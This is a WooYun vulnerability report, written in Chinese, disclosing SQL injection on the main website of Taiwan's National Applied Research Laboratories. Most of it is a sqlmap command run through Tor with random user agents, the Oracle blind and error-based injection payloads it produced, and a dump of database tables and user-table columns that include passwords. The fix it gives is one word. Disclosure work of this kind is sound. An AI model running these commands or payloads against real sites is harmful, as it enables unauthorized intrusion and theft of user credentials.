wybug_title: 國家實驗研究院主站SQL注入（臺灣地區）
wybug_status: 已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-10：	细节已通知厂商并且等待厂商处理中									2015-12-14：	厂商已经确认，细节仅向厂商公开									2015-12-24：	细节向核心白帽子及相关领域专家公开									2016-01-03：	细节向普通白帽子公开									2016-01-13：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述： 國家實驗研究院主站SQL注入 详细说明：  國家實驗研究院主站SQL注入   漏洞证明：  
$ ./sqlmap.py --tor --tor-type=SOCKS5 --random-agent --time-sec=20 --technique=BEUS --union-char=N -u "http://**.**.**.**/openinfo/abroad_report/abroad_report_search.php?apt_year=103&unit_no=&detail_proj_name=&country=&sub_proj_name=&apt_name=&pageID=7"---Parameter: apt_year (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: apt_year=103' AND 9845=9845 AND 'DXYI'='DXYI&unit_no=&detail_proj_name=&country=&sub_proj_name=&apt_name=&pageID=7    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: apt_year=103' AND 4580=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4580=4580) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND 'kpqV'='kpqV&unit_no=&detail_proj_name=&country=&sub_proj_name=&apt_name=&pageID=7---web application technology: Apache, PHP 5.4.21back-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):    'OPENINFO'current user is DBA:    FalseDatabase: OPENINFO+------------------------+---------+| Table                  | Entries |+------------------------+---------+| INFO_FILE_TB           | 1584    || ABROAD_REPORT_TB       | 1273    || SESSIONS               | 572     || OUTSOURCING_PROJECT_TB | 153     || ALL_BULLETINS_TB       | 100     || USER_TB                | 59      || ROLE_USER_TB           | 55      || ANNUAL_NEWS_TB         | 32      || ITEM_CONTACTER_TB      | 22      || LAWS_CONTRACTS_TB      | 15      || TEMP_ABROAD_REPORT_TB  | 15      || UNIT_TB                | 12      || APPLY_ABROAD_REPORT_TB | 8       || ROLE_TB                | 3       || ORGAN_CONTACT_TB       | 2       || WRTN_PUR_CONT_TB       | 1       |+------------------------+---------+Database: OPENINFOTable: USER_TB[5 columns]+---------------+----------+| Column        | Type     |+---------------+----------+| IS_ACTIVE     | NUMBER   || USER_CNAME    | VARCHAR2 || USER_ID       | VARCHAR2 || USER_PASSWORD | VARCHAR2 || USER_UNIT_NO  | VARCHAR2 |+---------------+----------+
   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
